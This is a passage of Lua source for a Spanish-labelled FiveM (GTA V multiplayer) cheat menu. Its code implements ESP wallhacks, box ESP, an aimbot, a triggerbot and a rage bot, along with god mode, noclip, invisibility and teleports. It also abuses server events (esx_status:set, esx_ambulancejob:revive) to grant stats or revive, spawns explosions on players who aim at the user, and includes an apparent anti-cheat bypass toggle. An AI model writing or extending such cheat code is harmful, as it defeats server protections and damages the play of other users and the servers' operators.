        local _x, _y = x / PCCT:ScrW() + _w / 2, y / PCCT:ScrH() + _h / 2

        PCCT:GetFunction("DrawRect")(_x, _y, _w, _h, r, g, b, a)

    end



    function PCCT.Painter:Hovered(x, y, w, h)

        local mx, my = PCCT:GetMousePos()



        if mx >= x and mx <= x + w and my >= y and my <= y + h then

            return true

        else

            return false

        end

    end



    local holding



    function PCCT.Painter:Holding(x, y, w, h, id)

        if PCCT:GetFunction("UpdateOnscreenKeyboard")() ~= -1 and PCCT:GetFunction("UpdateOnscreenKeyboard")() ~= 1 and PCCT:GetFunction("UpdateOnscreenKeyboard")() ~= 2 then return end

        if holding == id and PCCT:GetFunction("IsDisabledControlPressed")(0, 24) then return true end

        if holding ~= nil and PCCT:GetFunction("IsDisabledControlPressed")(0, 24) then return end



        if self:Hovered(x, y, w, h) and PCCT:GetFunction("IsDisabledControlPressed")(0, 24) then

            holding = id



            return true

        elseif holding == id and not self:Hovered(x, y, w, h) or not PCCT:GetFunction("IsDisabledControlPressed")(0, 24) then

            holding = nil

        end



        return false

    end



    function PCCT.Painter:HoveringID(id)

        local dat = buttons[id]

        if not dat then return false end



        return self:Hovered(dat.x, dat.y, dat.w, dat.h)

    end



    local clicked



    function PCCT.Painter:Clicked(x, y, w, h)

        if clicked then

            if not PCCT:GetFunction("IsDisabledControlPressed")(0, 24) then

                clicked = false

            end



            return false

        end



        if self:Hovered(x, y, w, h) and PCCT:GetFunction("IsDisabledControlJustReleased")(0, 24) then

            clicked = true



            return true

        end



        return false

    end



    function PCCT:Clamp(what, min, max)

        if what < min then

            return min

        elseif what > max then

            return max

        else

            return what

        end

    end



    function PCCT:LimitRenderBounds()

        local cx, cy = self.Config.MenuX, self.Config.MenuY

        cx = self:Clamp(cx, 5, self:ScrW() - self.MenuW - 5)

        cy = self:Clamp(cy, 42, self:ScrH() - self.MenuH - 5)

        local nx, ny = self.Config.NotifX, self.Config.NotifY



        if nx and ny and self.Config.NotifW then

            nx = self:Clamp(nx, 20, self:ScrW() - self.Config.NotifW - 20)

            ny = self:Clamp(ny, 20, self:ScrH() - picho.notifications_h - 20)

            self.Config.NotifX = nx

            self.Config.NotifY = ny

        end



        self.Config.MenuX = cx

        self.Config.MenuY = cy

    end



    function PCCT:AddCategory(title, func)

        self.Categories[#self.Categories + 1] = {

            Title = title,

            Build = func

        }

    end



    function PCCT:SetPedModel(model)

        if not self:RequestModelSync(model) then return self:AddNotification("ERROR", "Couldn't load model ~r~" .. model .. " ~s~in time.") end

        self:GetFunction("SetPlayerModel")(self.NetworkID, model)

    end



    function PCCT:GetPedVehicleSeat(ped)

        local vehicle = self:GetFunction("GetVehiclePedIsIn")(ped, false)

        local invehicle = self:GetFunction("IsPedInAnyVehicle")(ped, false)



        if invehicle then

            for i = -2, self:GetFunction("GetVehicleMaxNumberOfPassengers")(vehicle) do

                if (self:GetFunction("GetPedInVehicleSeat")(vehicle, i) == ped) then return i end

            end

        end



        return -2

    end



    function PCCT:GetModelLength(ent)

        local min, max = self:GetFunction("GetModelDimensions")(self:GetFunction("GetEntityModel")(ent))



        return max.y - min.y

    end



    function PCCT:GetModelHeight(ent)

        local min, max = self:GetFunction("GetModelDimensions")(self:GetFunction("GetEntityModel")(ent))



        return max.z - min.z

    end



    function PCCT:Tracker()

        if not self.TrackingPlayer then return end



        if not self:GetFunction("DoesEntityExist")(self:GetFunction("GetPlayerPed")(self.TrackingPlayer)) then

            self.TrackingPlayer = nil



            return

        end



        local coords = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self:GetFunction("GetPlayerPed")(self.TrackingPlayer, 0.0, 0.0, 0.0))

        self:GetFunction("SetNewWaypoint")(coords.x, coords.y)

    end



    local blips = {}



    function PCCT:DoBlips(remove)

        if remove or not self.Config.Player.Blips or not self.Enabled then

            if remove or #blips > 0 then

                for src, blip in picho.pairs(blips) do

                    self:GetFunction("RemoveBlip")(blip)

                    blips[src] = nil

                end

            end



            return

        end



        for src, blip in picho.pairs(blips) do

            if not self:GetFunction("DoesEntityExist")(self:GetFunction("GetPlayerPed")(src)) then

                self:GetFunction("RemoveBlip")(blip)

                blips[src] = nil

            else

                local coords = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self:GetFunction("GetPlayerPed")(src, 0.0, 0.0, 0.0))

                local head = self:GetFunction("GetEntityHeading")(self:GetFunction("GetPlayerPed")(src))

                self:GetFunction("SetBlipCoords")(blip, coords.x, coords.y, coords.z)

                self:GetFunction("SetBlipRotation")(blip, picho.math.ceil(head))

                self:GetFunction("SetBlipCategory")(blip, 7)

                self:GetFunction("SetBlipScale")(blip, 0.87)

            end

        end



        for id, src in picho.pairs(self.PlayerCache) do

            src = picho.tonumber(src)



            if self:GetFunction("DoesEntityExist")(self:GetFunction("GetPlayerPed")(src)) and not blips[src] and src ~= PCCT.NetworkID then

                local coords = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self:GetFunction("GetPlayerPed")(src, 0.0, 0.0, 0.0))

                local head = self:GetFunction("GetEntityHeading")(self:GetFunction("GetPlayerPed")(src))

                local blip = self:GetFunction("AddBlipForCoord")(coords.x, coords.y, coords.z)

                self:GetFunction("SetBlipSprite")(blip, 1)

                self:GetFunction("ShowHeadingIndicatorOnBlip")(blip, true)

                self:GetFunction("SetBlipRotation")(blip, picho.math.ceil(head))

                self:GetFunction("SetBlipScale")(blip, 0.87)

                self:GetFunction("SetBlipCategory")(blip, 7)

                self:GetFunction("BeginTextCommandSetBlipName")("STRING")

                self:GetFunction("AddTextComponentSubstringPlayerName")(self:GetFunction("GetPlayerName")(src))

                self:GetFunction("EndTextCommandSetBlipName")(blip)

                blips[src] = blip

            end

        end

    end



    function PCCT:DoAntiAim()

        if not self.Config.Player.AntiAim then return end



        for id, src in picho.pairs(self.PlayerCache) do

            src = picho.tonumber(src)

            local ped = self:GetFunction("GetPlayerPed")(src)

            local ret, ent = self:GetFunction("GetEntityPlayerIsFreeAimingAt")(src)



            if ret and ent == self.LocalPlayer then

                local pos = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)

                self:GetFunction("AddExplosion")(pos.x, pos.y, pos.z, 1, 0.0, false, true, 10.0)

            end

        end

    end



    function PCCT:TeleportToWaypoint()

        local waypoint = self:GetFunction("GetFirstBlipInfoId")(8)

        if not DoesBlipExist(waypoint) then return self:AddNotification("ERROR", "Nesecitas una marca en el mapa!") end

        local coords = self:GetFunction("GetBlipInfoIdCoord")(waypoint)



        CreateThread(function()

            for height = 100, -100, -5 do

                self:GetFunction("SetPedCoordsKeepVehicle")(self.LocalPlayer, coords.x, coords.y, height + 0.0)

                local foundGround, zPos = self:GetFunction("GetGroundZFor_3dCoord")(coords.x, coords.y, height + 0.0)



                if foundGround then

                    self:GetFunction("SetPedCoordsKeepVehicle")(self.LocalPlayer, coords.x, coords.y, zPos + 0.0)

                    break

                end



                Wait(5)

            end



            self:AddNotification("EXITO", "TP Exitoso.")

        end)

    end



    local esp_talk_col = PCCT.Config.Tertiary



    function PCCT:DoESP()

        if not self.Config.Player.ESP then return end

        local spot = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self.LocalPlayer, 0.0, 0.0, 0.0)



        if self.FreeCam and self.FreeCam.On and camX and camY and camZ then

            spot = vector3(camX, camY, camZ)

        elseif self.SpectatingPlayer and self:GetFunction("DoesEntityExist")(self:GetFunction("GetPlayerPed")(self.SpectatingPlayer)) then

            spot = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self:GetFunction("GetPlayerPed")(self.SpectatingPlayer, 0.0, 0.0, 0.0))

        elseif self.RCCar.On and self.RCCar.CamOn and rc_camX and rc_camY and rc_camZ then

            spot = vector3(rc_camX, rc_camY, rc_camZ)

        end



        for id, src in picho.pairs(self.PlayerCache) do

            src = picho.tonumber(src)

            local ped = self:GetFunction("GetPlayerPed")(src)



            if self:GetFunction("DoesEntityExist")(ped) and ped ~= self.LocalPlayer then

                local _id = picho.tonumber(self:GetFunction("GetPlayerServerId")(src))

                local coords = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, picho.vector_origin.x, picho.vector_origin.y, picho.vector_origin.z)

                local dist = self:GetFunction("GetDistanceBetweenCoords")(spot.x, spot.y, spot.z, coords.x, coords.y, coords.z)

                local seat = picho.tonumber(self:GetPedVehicleSeat(ped))



                if seat ~= -2 then

                    seat = seat + 0.25

                end



                if dist <= self.Config.Player.ESPDistance then

                    local pos_z = coords.z + 1.2



                    if seat ~= -2 then

                        pos_z = pos_z + seat

                    end



                    local _on_screen, _, _ = self:GetFunction("GetScreenCoordFromWorldCoord")(coords.x, coords.y, pos_z)



                    if _on_screen and self.Config.Player.Box then

                        self:DoBoxESP(src, ped)

                    end



                    if _on_screen and self.Config.Player.Names then

                        local add = ""



                        if self.Config.Player.NameWeapons then

                            local wep = self:GetFunction("GetSelectedPedWeapon")(ped)

                            local name = all_weapons_hashes[wep] or "UNKNOWN"

                            add = " (Weapon: " .. name .. ")"

                        end



                        local col = picho.color_white



                        if self:GetFunction("IsPedDeadOrDying")(ped) then

                            col = picho.color_dead

                        end



                        if self:GetFunction("NetworkIsPlayerTalking")(src) then

                            self:Draw3DText(coords.x, coords.y, pos_z, _id .. " | " .. self:CleanName(self:GetFunction("GetPlayerName")(src), true) .. " [" .. picho.math.ceil(dist) .. "M" .. "]" .. add, esp_talk_col[1], esp_talk_col[2], esp_talk_col[3])

                        else

                            self:Draw3DText(coords.x, coords.y, pos_z, _id .. " | " .. self:CleanName(self:GetFunction("GetPlayerName")(src), true) .. " [" .. picho.math.ceil(dist) .. "M" .. "]" .. add, col[1], col[2], col[3])

                        end

                    end

                end

            end

        end

    end



    function PCCT:DoBoxESP(src, ped)

        local r, g, b, a = 255, 255, 255, 255



        if self:GetFunction("NetworkIsPlayerTalking")(src) then

            r, g, b = esp_talk_col[1], esp_talk_col[2], esp_talk_col[3]

        end



        local model = self:GetFunction("GetEntityModel")(ped)

        local min, max = self:GetFunction("GetModelDimensions")(model)

        local top_front_right = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, max)

        local top_back_right = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector3(max.x, min.y, max.z))

        local bottom_front_right = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector3(max.x, max.y, min.z))

        local bottom_back_right = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector3(max.x, min.y, min.z))

        local top_front_left = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector3(min.x, max.y, max.z))

        local top_back_left = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector3(min.x, min.y, max.z))

        local bottom_front_left = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector3(min.x, max.y, min.z))

        local bottom_back_left = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, min)

        -- LINES

        -- RIGHT SIDE

        self:GetFunction("DrawLine")(top_front_right, top_back_right, r, g, b, a)

        self:GetFunction("DrawLine")(top_front_right, bottom_front_right, r, g, b, a)

        self:GetFunction("DrawLine")(bottom_front_right, bottom_back_right, r, g, b, a)

        self:GetFunction("DrawLine")(top_back_right, bottom_back_right, r, g, b, a)

        -- LEFT SIDE

        self:GetFunction("DrawLine")(top_front_left, top_back_left, r, g, b, a)

        self:GetFunction("DrawLine")(top_back_left, bottom_back_left, r, g, b, a)

        self:GetFunction("DrawLine")(top_front_left, bottom_front_left, r, g, b, a)

        self:GetFunction("DrawLine")(bottom_front_left, bottom_back_left, r, g, b, a)

        -- Connection

        self:GetFunction("DrawLine")(top_front_right, top_front_left, r, g, b, a)

        self:GetFunction("DrawLine")(top_back_right, top_back_left, r, g, b, a)

        self:GetFunction("DrawLine")(bottom_front_left, bottom_front_right, r, g, b, a)

        self:GetFunction("DrawLine")(bottom_back_left, bottom_back_right, r, g, b, a)

    end



    PCCT:AddCategory("Tu Mismo", function(self, x, y, w, h)

        local curY = 5



        if self.Painter:CheckBox("MODO DIOS", self.Config.Player.God, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "god_enabled") then

            if self.Config.SafeMode then

                self:AddNotification("AVISO", "Modo seguro activado, desactivalo para poder usarlo")

            else

                self.Config.Player.God = not self.Config.Player.God

            end

        end



        curY = curY + 25



        if self.Painter:CheckBox("SEMI DIOS", self.Config.Player.SemiGod, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "semi_god_enabled") then

            self.Config.Player.SemiGod = not self.Config.Player.SemiGod

        end



        curY = curY + 25



        if self.Painter:CheckBox("STAMINA INFINITA", self.Config.Player.InfiniteStamina, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "infinite_stamina") then

            self.Config.Player.InfiniteStamina = not self.Config.Player.InfiniteStamina

        end



        curY = curY + 25



        if self.Painter:CheckBox("SIN TRAPO", self.Config.Player.NoRagdoll, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "no_ragdoll_enabled") then

            self.Config.Player.NoRagdoll = not self.Config.Player.NoRagdoll

        end



        curY = curY + 25



        if self.Painter:CheckBox("BYPASS ANTI BJ", self.Config.Player.BypassBJ, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "bypass_bj") then

            self.Config.Player.BypassBJ = not self.Config.Player.BypassBJ

        end



        curY = curY + 25



        if self.Painter:CheckBox("INVISIBILIDAD", self.Config.Player.Invisibility, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "invisibility_enabled") then

            self.Config.Player.Invisibility = not self.Config.Player.Invisibility

        end



        curY = curY + 25



        if self.Painter:CheckBox("MOSTRAR JUGADORES INVISIBLES", self.Config.Player.RevealInvisibles, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "reveal_invis_players") then

            self.Config.Player.RevealInvisibles = not self.Config.Player.RevealInvisibles

        end



        curY = curY + 25



        if self.Painter:CheckBox("CORRER RAPIDO", self.Config.Player.FastRun, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "fast_af_runna_enabled") then

            if self.Config.SafeMode then

                self:AddNotification("AVISO", "Modo seguro activado, desactivalo para poder usarlo")

            else

                self.Config.Player.FastRun = not self.Config.Player.FastRun

            end

        end



        curY = curY + 25



        if self.Painter:CheckBox("SUPER SALTO", self.Config.Player.SuperJump, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "big_jump_enabled") then

            if self.Config.SafeMode then

                self:AddNotification("AVISO", "Modo seguro activado, desactivalo para poder usarlo")

            else

                self.Config.Player.SuperJump = not self.Config.Player.SuperJump

            end

        end



        curY = curY + 25



        if self.Painter:CheckBox("SUPER MAN (~b~TESTEO~w~)", self.Config.Player.SuperMan, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "super_man_enabled") then

            self.Config.Player.SuperMan = not self.Config.Player.SuperMan



            if self.Config.Player.SuperMan then

                self:AddNotification("INFO", "Press " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, "Space") .. " to go up / " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, "W") .. " to go forward.")

            end

        end



        curY = curY + 25



        if self.Painter:CheckBox("ALADIN", self.Config.Player.MagicCarpet, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "magic_carpet_enabled") then

            if self.Config.SafeMode then

                self:AddNotification("AVISO", "Modo seguro activado, desactivalo para poder usarlo")

            else

              self.Config.Player.MagicCarpet = not self.Config.Player.MagicCarpet

            end

        end



        curY = curY + 25



        if self.Painter:CheckBox("MINIMAPA", self.Config.Player.ForceRadar, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "force_radar") then

            self.Config.Player.ForceRadar = not self.Config.Player.ForceRadar

        end



        curY = curY + 25



        if self.Painter:CheckBox("VISION TERMICA", self.Config.Player.ThermalVision, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "thermal_vision") then

            self.Config.Player.ThermalVision = not self.Config.Player.ThermalVision

        end



        curY = curY + 25



        if self.Painter:CheckBox("NOCLIP", self.Config.Player.NoClip, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "togle_noclip") then

            if self.Config.SafeMode then

                self:AddNotification("AVISO", "Modo seguro activado, desactivalo para poder usarlo")

            else

                self.Config.Player.NoClip = not self.Config.Player.NoClip

            end

        end



        curY = curY + 20



        if self.Painter:Button("CURARSE" .. (self:GetBindText("heal_option", self.Painter:HoveringID("heal_option"))), x, y, 5, curY, nil, 20, 255, 255, 255, 255, "heal_option") or self:WasBindPressed("heal_option") then

            self:GetFunction("SetEntityHealth")(self.LocalPlayer, 200)

            self:GetFunction("ClearPedBloodDamage")(self.LocalPlayer)

            self:AddNotification("EXITO", "Curado.")

        end



        curY = curY + 25



        if self.Painter:Button("QUITAR SANGRE" .. (self:GetBindText("clear_blood_option", self.Painter:HoveringID("clear_blood_option"))), x, y, 5, curY, nil, 20, 255, 255, 255, 255, "clear_blood_option") or self:WasBindPressed("clear_blood_option") then

            self:GetFunction("ClearPedBloodDamage")(self.LocalPlayer)

            self:AddNotification("EXITO", "Sangre quitada.")

        end



        curY = curY + 25



        if self.Painter:Button("DAR ARMADURA" .. (self:GetBindText("armor_option", self.Painter:HoveringID("armor_option"))), x, y, 5, curY, nil, 20, 255, 255, 255, 255, "armor_option") or self:WasBindPressed("armor_option") then

            self:GetFunction("SetPedArmour")(self.LocalPlayer, 200)

            self:AddNotification("EXITO", "Armadura dada.")

        end



        curY = curY + 25



        if self.Painter:Button("MATARSE" .. (self:GetBindText("suicide_option", self.Painter:HoveringID("suicide_option"))), x, y, 5, curY, nil, 20, 255, 255, 255, 255, "suicide_option") or self:WasBindPressed("armor_option") then

            self:GetFunction("SetEntityHealth")(self.LocalPlayer, 0)

            self:AddNotification("EXITO", "cerrado.")

        end



        curY = curY + 25



        if self.DynamicTriggers["esx_ambulancejob"] and self.DynamicTriggers["esx_ambulancejob"]["esx_ambulancejob:revive"] then

            if self.Painter:Button("REVIVE ~g~ESX", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "esx_revive") then

                self:GetFunction("TriggerEvent")(self.DynamicTriggers["esx_ambulancejob"]["esx_ambulancejob:revive"])

                self:AddNotification("EXITO", "Revivido.")

            end



            curY = curY + 25

        end



        if self.Painter:Button("REVIVIR (LOCAL)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "native_revive") then

            self:GetFunction("NetworkResurrectLocalPlayer")(self:GetFunction("GetOffsetFromEntityInWorldCoords")(self.LocalPlayer, 0.0, 0.0, 0.0), self:GetFunction("GetEntityHeading")(self.LocalPlayer))

            self:AddNotification("EXITO", "Revivido.")

        end



        curY = 5

        local _w = (self.Painter:GetTextWidth("DRIVE TO WAYPOINT (REQUIRES VEHICLE)", 4, 0.37)) + 26



        if self.Painter:CheckBox("CONDUCIR AL OBJETIVO (REQUIERE COCHE", self.Config.Player.MoveToWaypoint, x, y, w - _w, curY, nil, 20, 255, 255, 255, 255, "wander_to_waypoint") then

            if self:IsWaypointValid() then

                if not PCCT:GetFunction("IsPedInAnyVehicle")(PCCT.LocalPlayer) or PCCT:GetFunction("GetPedInVehicleSeat")(PCCT:GetFunction("GetVehiclePedIsIn")(PCCT.LocalPlayer), -1) ~= PCCT.LocalPlayer then

                    self:AddNotification("ERROR", "Nesecitas estar en un coche para usar esto!")

                else

                    self.Config.Player.MoveToWaypoint = not self.Config.Player.MoveToWaypoint

                    picho.moving_wp = false

                    self:GetFunction("ClearPedTasks")(self.LocalPlayer)

                end

            else

                self:AddNotification("ERROR", "Nesecitas un punto en el mapa")

            end

        end



        curY = curY + 20

        local _w = (self.Painter:GetTextWidth("TP CORDENADAS", 4, 0.37)) + 2



        if self.Painter:Button("TP CORDENADAS", x, y, w - _w, curY, nil, 20, 255, 255, 255, 255, "teleport_to_coords") then

            local x, y, z

            _x = self:GetTextInput("Pon la cordenada X.", 0, 15)



            if _x and picho.tonumber(_x) then

                x = _x

            end



            if x then

                local _y = self:GetTextInput("Pon la cordenada Y.", 0, 15)



                if _y and picho.tonumber(_y) then

                    y = _y

                end

            end



            if x and y then

                local _z = self:GetTextInput("Pon la cordenada Z.", 0, 15)



                if _z and picho.tonumber(_z) then

                    z = _z

                end

            end



            if x and y and z then

                x = picho.tonumber(x) + 0.0

                y = picho.tonumber(y) + 0.0

                z = picho.tonumber(z) + 0.0

                self:GetFunction("SetEntityCoords")(self.LocalPlayer, x, y, z, false, false, false, false)

                self:AddNotification("EXITO", "Teletransportado.", 5000)

            else

                self:AddNotification("INFO", "Cancelado.", 5000)

            end

        end



        curY = curY + 25

        local _w = (self.Painter:GetTextWidth("CORDENADAS MARCA", 4, 0.37)) + 2



        if self.Painter:Button("CORDENADAS MARCA", x, y, w - _w, curY, nil, 20, 255, 255, 255, 255, "waypoint_to_coords") then

            local x, y

            _x = self:GetTextInput("Pon la cordenada X.", 0, 15)



            if _x and picho.tonumber(_x) then

                x = _x

            end



            if x then

                local _y = self:GetTextInput("Pon la cordenada Y.", 0, 15)



                if _y and picho.tonumber(_y) then

                    y = _y

                end

            end



            if x and y then

                x = picho.tonumber(x) + 0.0

                y = picho.tonumber(y) + 0.0

                PCCT:GetFunction("SetNewWaypoint")(x, y)

                self:AddNotification("EXITO", "Se puso correctamente.", 5000)

            else

                self:AddNotification("INFO", "Cancelado.", 5000)

            end

        end



        curY = curY + 25

        local _w = (self.Painter:GetTextWidth("TP AL OBJETIVO", 4, 0.37)) + 2



        if self.Painter:Button("TP AL OBJETIVO", x, y, w - _w, curY, nil, 20, 255, 255, 255, 255, "teleport_to_waypoint") then

            self:TeleportToWaypoint()

        end


        curY = curY + 25



        if resource_list["esx_status"] then

            if self.Painter:Button("Dar Comida ~g~ESX ~r~(AC)", x, y, w - _w, curY, nil, 20, 255, 255, 255, 255, "esx_status") then
    
                for i = 1, 2 do
    
                    self:GetFunction("TriggerServerEvent")("esx_status:set", "hunger", 100000)
    
                    self:GetFunction("TriggerServerEvent")("esx_status:set", "thirst", 1000000)
    
                end
    
                self:AddNotification("INFO", "Ahora tienes comida!")
    
            end
    
        end



    end)



    function PCCT:GetBindText(opt, clicking)

        local cfg = self.Config.Binds

        local text = ""

        if not cfg then return " [ERROR]" end



        if cfg[opt] == nil then

            text = ""

        else

            text = " [" .. cfg[opt] .. "]"

        end



        if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["MOUSE2"]) and not picho.binding and clicking then

            picho.binding = opt

        end



        if picho.binding == opt then

            PCCT:GetFunction("DisableControlAction")(0, PCCT.Keys["ESC"], true)

            PCCT:GetFunction("DisableControlAction")(1, PCCT.Keys["ESC"], true)



            if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["ESC"]) then

                picho.binding = nil

                cfg[opt] = nil



                return " [UNBOUND]"

            else

                for name, control in picho.pairs(self.Keys) do

                    if name ~= "BACKSPACE" and name ~= "MOUSE2" and name ~= "RIGHTCTRL" then

                        if self:GetFunction("IsDisabledControlPressed")(0, control) then

                            picho.binding = nil

                            picho.bind_time = GetGameTimer() + 300

                            cfg[opt] = name



                            return " [" .. name .. "]"

                        end

                    end

                end

            end



            return " [PRESIONA CUALQUIER TECLA]"

        end



        return text

    end



    function PCCT:WasBindPressed(opt)

        local cfg = self.Config.Binds

        if not cfg or not cfg[opt] then return end

        if picho.bind_time > self:GetFunction("GetGameTimer")() then return end



        if self:GetFunction("IsDisabledControlPressed")(0, self.Keys[cfg[opt]]) and not picho.binds[opt] then

            picho.binds[opt] = true



            return true

        elseif self:GetFunction("IsDisabledControlReleased")(0, self.Keys[cfg[opt]]) and picho.binds[opt] then

            picho.binds[opt] = false

        end

    end



    function PCCT:DoBindListener()

        local cfg = self.Config.Binds

        if not cfg then return end



        for name, key in picho.pairs(cfg) do

            if picho.bind_handler[name] and self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys[key]) then

                picho.bind_handler[name](PCCT)

            end

        end

    end



    function PCCT:AddBindListener(name, func)

        picho.bind_handler[name] = func

    end



    PCCT:AddCategory("ESP(~b~TEST~w~)", function(self, x, y)

        local curY = 5



        if self.Painter:CheckBox("ESP", self.Config.Player.ESP, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "esp_enabled") then

            self.Config.Player.ESP = not self.Config.Player.ESP

        end



        curY = curY + 25



        if self.Painter:CheckBox("NOMBRES", self.Config.Player.Names, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "esp_names_enabled") then

            self.Config.Player.Names = not self.Config.Player.Names

        end



        curY = curY + 25



        if self.Painter:CheckBox("INCLUIR ARMA EN NOMBRE", self.Config.Player.NameWeapons, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "esp_name_weapons_enabled") then

            self.Config.Player.NameWeapons = not self.Config.Player.NameWeapons

        end



        curY = curY + 25



        if self.Painter:CheckBox("CAJA", self.Config.Player.Box, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "esp_box_enabled") then

            self.Config.Player.Box = not self.Config.Player.Box

        end



        curY = curY + 25



        if self.Painter:CheckBox("BLIPS", self.Config.Player.Blips, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "esp_blips_enabled") then

            if self.Config.Player.Blips then

                self:DoBlips(true)

            end



            self.Config.Player.Blips = not self.Config.Player.Blips

        end



        curY = curY + 25



        if self.Painter:CheckBox("PUNTO EN LA PANTALLA", self.Config.Player.CrossHair, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "crosshair_enabled") then

            self.Config.Player.CrossHair = not self.Config.Player.CrossHair

        end



        curY = curY + 20



        if self.Painter:Button("DISTANCIA DEL ESP: " .. self.Config.Player.ESPDistance, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "set_aimbot_fov") then

            local new = self:GetTextInput("Enter ESP Draw Distance [5-50000]", self.Config.Player.ESPDistance, 7)

            if not picho.tonumber(new) then return self:AddNotification("ERROR", "Invalid distance.") end

            if picho.tonumber(new) < 5 or picho.tonumber(new) > 50000 then return self:AddNotification("ERROR", "Invalid distance.") end

            self.Config.Player.ESPDistance = picho.tonumber(new) + 0.0

            self:AddNotification("EXITO", "Cambiado a " .. self.Config.Player.ESPDistance .. ".")

        end

    end)



    PCCT:AddCategory("Combate", function(self, x, y, w, h)

        local curY = 5



        if self.Painter:CheckBox("DISPARO AUTOMATICO", self.Config.Player.TriggerBot, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "trigger_bot_enabled") then

            self.Config.Player.TriggerBot = not self.Config.Player.TriggerBot

        end



        curY = curY + 25



        if self.Painter:CheckBox("DISPARO NESECITA LOS", self.Config.Player.TriggerBotNeedsLOS, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "triggerbot_need_los_enabled") then

            self.Config.Player.TriggerBotNeedsLOS = not self.Config.Player.TriggerBotNeedsLOS

        end



        curY = curY + 25



        if self.Painter:CheckBox("AIMBOT(~g~SEGURO~w~)", self.Config.Player.Aimbot, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "aimbot_enabled") then

            self.Config.Player.Aimbot = not self.Config.Player.Aimbot

        end



        curY = curY + 25



        if self.Painter:CheckBox("AIMBOT NESECITA LOS", self.Config.Player.AimbotNeedsLOS, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "aimbot_need_los_enabled") then

            self.Config.Player.AimbotNeedsLOS = not self.Config.Player.AimbotNeedsLOS

        end



        curY = curY + 25



        if self.Painter:CheckBox("TP BALAS", self.Config.Player.TPBullets, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "tpbullets_enabled") then

            self.Config.Player.TPBullets = not self.Config.Player.TPBullets

        end



        curY = curY + 25



        if self.Painter:CheckBox("MOSTRAR FOV", self.Config.Player.AimbotDrawFOV, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "draw_aimbot_fov") then

            self.Config.Player.AimbotDrawFOV = not self.Config.Player.AimbotDrawFOV

        end



        curY = curY + 25



        if self.Painter:CheckBox("SOLO JUGADORES", self.Config.Player.OnlyTargetPlayers, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "only_target_players") then

            self.Config.Player.OnlyTargetPlayers = not self.Config.Player.OnlyTargetPlayers

        end



        curY = curY + 25



        if self.Painter:CheckBox("RODAR INFINITAMENTE", self.Config.Player.InfiniteCombatRoll, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "infinite_combat_roll") then

            self.Config.Player.InfiniteCombatRoll = not self.Config.Player.InfiniteCombatRoll

        end



        curY = curY + 25



        if self.Painter:CheckBox("~r~RAGE ~s~BOT", self.Config.Player.RageBot, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "rage_bot") then

            self.Config.Player.RageBot = not self.Config.Player.RageBot

        end



        curY = curY + 25



        if self.Painter:CheckBox("SIN CAIDA DE BALA", self.Config.Player.NoDrop, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "no_bullet_drop") then

            self.Config.Player.NoDrop = not self.Config.Player.NoDrop

        end



        curY = curY + 25



        if self.Painter:CheckBox("NO RECARGAR", self.Config.Player.NoReload, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "no_reload") then

            self.Config.Player.NoReload = not self.Config.Player.NoReload

        end



        curY = curY + 25



        if self.Painter:CheckBox("MUNICION INFINITA", self.Config.Player.InfiniteAmmo, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "infinite_ammo") then

            self.Config.Player.InfiniteAmmo = not self.Config.Player.InfiniteAmmo

        end



        curY = curY + 25



        if self.Painter:CheckBox("DISPARO RAPIDO", self.Config.Player.RapidFire, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "rapid_fire") then

            self.Config.Player.RapidFire = not self.Config.Player.RapidFire

        end



        curY = curY + 25



        if self.Painter:CheckBox("MUNICION EXPLOSIVA", self.Config.Player.ExplosiveAmmo, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "explosive_ammo") then

            if self.Config.SafeMode then

                self:AddNotification("AVISO", "El modo seguro esta activo, si quieres usar esto, desactivalo.")
